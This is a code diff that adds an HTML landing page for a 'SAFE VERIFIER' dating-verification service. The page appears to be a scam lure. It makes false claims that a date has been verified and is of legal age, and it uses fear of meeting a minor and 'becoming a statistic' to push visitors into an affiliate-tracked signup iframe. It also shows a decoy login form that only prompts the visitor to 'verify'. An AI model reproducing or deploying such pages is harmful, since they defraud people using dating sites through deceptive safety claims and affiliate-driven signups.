@@ -1,0 +1,131 @@
+
+
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml"><head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js" ></script>
+<script type="text/javascript" src="https://lsf.circularplug.com/st/land/002as7/js/bootstrap.js"></script>
+<script type="text/javascript" src="https://lsf.circularplug.com/st/land/002as7/js/selector.js"></script>
+<link rel="stylesheet" type="text/css" href="https://lsf.circularplug.com/st/land/002as7/css/bootstrap-responsive.css" />
+<link rel="stylesheet" type="text/css" href="https://lsf.circularplug.com/st/land/002as7/css/base.css" />
+<link REL="SHORTCUT ICON" HREF="images/favicon.ico">
+<title>.: Welcome :.</title>
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js" ></script>
+<script>
+var random_images_array = ["logo.png", "logo1.png", "logo2.png", 
+    "logo3.png", "logo4.png", "logo5.png", 
+    "logo6.png"];
+	
+function getRandomImage(imgAr, path) {
+    path = path || 'images/'; // default path here
+    var num = Math.floor( Math.random() * imgAr.length );
+    var img = imgAr[ num ];
+    var imgStr = '<img src="' + path + img + '" alt = "">';
+    document.write(imgStr); document.close();
+}
+
+
+</script>
+<script>
+function function1() {
+    document.all.frame1.allowTransparency = "false";
+    document.all.frame1.style.backgroundColor = "white";
+    document.all.frame2.allowTransparency = "true";
+    document.all.frame2.style.backgroundColor = "lightgreen"; 
+} 
+</script>
+<style type="text/css">
+.hovergallery img
+{
+-webkit-transform:scale(0.8); /*Webkit: Scale down image to 0.8x original size*/
+-moz-transform:scale(0.8); /*Mozilla scale version*/
+-o-transform:scale(0.8); /*Opera scale version*/
+-webkit-transition-duration: 0.8s; /*Webkit: Animation duration*/
+-moz-transition-duration: 0.8s; /*Mozilla duration version*/
+-o-transition-duration: 0.8s; /*Opera duration version*/
+opacity: 0.7; /*initial opacity of images*/
+margin: 0 10px 5px 0; /*margin between images*/
+border-radius: 2px;
+top:10px;
+position: relative;
+}
+
+.hovergallery img:hover{
+-webkit-transform:scale(10.1); /*Webkit: Scale up image to 1.2x original size*/
+-moz-transform:scale(10.1); /*Mozilla scale version*/
+-o-transform:scale(10.1); /*Opera scale version*/
+box-shadow:0px 0px 0px gray; /*CSS3 shadow: 30px blurred shadow all around image*/
+-webkit-box-shadow:0px 0px 0px gray; /*Safari shadow version*/
+-moz-box-shadow:0px px 0px gray; /*Mozilla shadow version*/
+opacity: 1;
+top: 150px;
+}
+
+</style> 
+
+</head>
+ 
+
+<bodyonLoad="function1();">
+   <div class="container center">
+     <div class="row-fluid header">
+         <div class="span4"> <span id="logo"><script type="text/javascript">getRandomImage(random_images_array)</script></span> </div>
+         <div class="span6 offset2"> 
+             <div ID="login" >
+                <form action="#">
+                    <label for="username">User Name</label>  
+                    <input id="username" type="text" name="username">
+                    <label for="password">Password</label> 
+                    <input id="password" type="password" name="password"> 
+                    <input id="submit" type="submit" onclick="alert('Please Verify Yourself for More Information');" value="Log In">
+                </form>
+            </div> <!-- End Login -->
+         </div> 
+     </div> <!-- End Header -->
+     
+     <div class="row-fluid hero">
+       <div class=" span7 ie">
+       <h2>Get verified in <span class="orange"> 20 seconds </span> <br/>
+       100% <span class="yellow">FREE </span></h2>
+       <h3>Get verified and meet people within your area</h3>
+       <p>Your date has been verified to be who he/she says. He/She is of legal age to exchange adult photos and meet you in person. 
+       SAFE VERIFIER eliminates the fear of exchanging sexual content, or even worse, meeting a minor for sex. </p>
+       
+       </div> 
+       <div class="span5 form">
+       <br/><center>
+<div class="hovergallery">
+<img src="https://discreet-selfcard.netlify.com/js/1.jpg" height="40" width="40" />
+<img src="https://discreet-selfcard.netlify.com/js/2.jpg" height="40" width="40" />
+<img src="https://discreet-selfcard.netlify.com/js/3.jpg" height="40" width="40" />
+</div>
+
+<iframe allowTransparency="true" id="frame1"  src="//venom01.joinsafelyonline.com/routes/venom01/?ofid=8&wlid=colossal&a_aid=venom01&a_bid=62151fcd&chan=code15" frameborder="0" height="450" scrolling="no" width="360"></iframe>
+</center></div>
+       <!-- <center class="banner"><img src="images/protect.png" width="700" height="60" /></center>-->
+     </div> <!-- End Hero -->
+   </div><!-- End Content -->
+   
+   <div class="content">
+     <div class="container center">
+      <br/> <br/> <br/>
+     <div class="row-fluid footer">
+        <center>
+        <h3>THE SAFEST WAY TO MEET PEOPLE ONLINE </h3>
+        <h2>DON'T BECOME A STATISTIC!</h2>
+        <br/> <br/>
+        </center>
+      </div> <!-- End Footer -->
+     
+    </div><!-- End Container -->
+     
+   </div> <!-- End Content 2 -->
+ 
+   
+
+</body>
+</html>
